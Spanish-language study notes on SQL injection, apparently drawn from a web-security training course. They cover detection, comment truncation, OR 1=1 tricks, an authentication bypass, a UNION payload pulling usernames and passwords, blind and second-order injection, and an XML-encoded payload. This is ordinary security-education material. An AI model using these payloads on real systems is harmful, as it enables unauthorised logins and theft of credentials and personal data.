# Inyección SQL (SQLi)

Es una vulnerabilidad web que permite al atacante interferir con las consultas que una aplicación hace a su base de datos. Esto puede permitir acceso a datos confidenciales como contraseñas, datos de tarjeta de crédito e información personal.

---

## Cómo detectar vulnerabilidades de inyección SQL

Realizar un conjunto sistemático de pruebas manuales en cada punto de entrada de la aplicación:

* Insertar un apóstrofo (`'`) al escribir para buscar errores o anomalías.
* Probar condiciones booleanas y comparar respuestas: por ejemplo `OR 1=1` vs `OR 1=2`.
* Usar payloads que provoquen retrasos (time-based) y observar diferencias en el tiempo de respuesta.

---

## Inyección SQL en diferentes partes de la consulta

Suele encontrarse en cláusulas `WHERE` y en consultas `SELECT`, pero también puede aparecer en:

* `UPDATE`: dentro de los valores actualizados o en la cláusula `WHERE`.
* `INSERT`: dentro de los valores insertados.
* `SELECT`: dentro del nombre de la tabla o columna.
* `SELECT`: en la cláusula `ORDER BY`.

---

## Recuperación de datos ocultos (ejemplos)

URL vulnerable:

```
https://insecure-website.com/products?category=Gifts
```

Consulta generada por la aplicación:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

* Forzar comentario para eliminar condiciones:

```
https://insecure-website.com/products?category=Gifts'--
```

Resultado en SQL:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

Se elimina `AND released = 1` y se muestran más productos.

* Forzar `OR 1=1` para devolver todos los elementos:

```
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Resultado en SQL:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

`1=1` siempre es verdadero, por lo que la consulta devuelve todos los registros.

> Si `OR 1=1` se aplica en `UPDATE` o `DELETE`, se pueden perder o modificar datos accidentalmente.

---

## Subvertir la lógica de la aplicación (ejemplo de login)

Consulta esperada:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

Input malicioso:

```
username: administrator'--
password: (vacío)
```

Consulta resultante:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

La parte tras `--` queda comentada, permitiendo autenticarse como `administrator` si ese usuario existe.

---

## Recuperación de datos de otras tablas (UNION)

Consulta original:

```sql
SELECT name, description FROM products WHERE category = 'Gifts'
```

Payload de ataque:

```
' UNION SELECT username, password FROM users--
```

Si la aplicación concatena o muestra resultados, puede devolver `username` y `password` desde la tabla `users` junto con los campos de `products`.

---

## Vuln SQLi ciega (blind SQLi)

La aplicación no devuelve los resultados de la consulta ni detalles de errores de la base de datos en sus respuestas, por lo que el atacante debe inferir información mediante pruebas booleanas o de tiempo.

---

## Inyección SQL de segundo orden (resumen)

La inyección SQL de segundo orden ocurre cuando:

1. La aplicación recibe entrada del usuario y la **almacena** (por ejemplo en la base de datos) sin que en ese punto se produzca un fallo visible.
2. Más tarde, la aplicación **recupera** esos datos y los incorpora en una consulta SQL de forma insegura.

* Causa típica: los desarrolladores **asumen** que los datos previamente almacenados son seguros y los reutilizan sin validación ni escape.
* Consecuencia: los datos almacenados pueden ejecutar código malicioso cuando se vuelven a procesar (lectura, modificación o eliminación de datos).

*(También conocida como inyección SQL almacenada.)*

---

## Examinando bases de datos (resumen)

Después de identificar una vulnerabilidad SQLi, obtener información sobre la base de datos ayuda a explotar la vulnerabilidad y adaptar payloads.

* Conceptos:

  * Existen variantes de SQL según el motor (MySQL, PostgreSQL, Oracle, SQL Server, etc.).
  * Conocer el motor y la versión permite usar consultas y funciones específicas.

* Consultas de ejemplo citadas en los apuntes:

```sql
-- Ver la versión (ejemplo mencionado)
SELECT * FROM v$version

-- Listar tablas (esquema estándar)
SELECT * FROM information_schema.tables
```

* Nota: los nombres de vistas y la sintaxis pueden variar según el motor; adaptar las consultas al objetivo.

---

## SQLi en diferentes contextos (JSON / XML)

Algunos sitios reciben datos en formatos como JSON o XML. Ejemplo de payload XML con escape:

```xml
<stockCheck>
    <productId>123</productId>
    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
</stockCheck>
```

El escape `&#x53;` representa la letra `S`; esto puede decodificarse en el servidor antes de pasar al intérprete SQL.

---

*Fin del documento — contenido reestructurado y corregido manteniendo únicamente la información original proporcionada.*
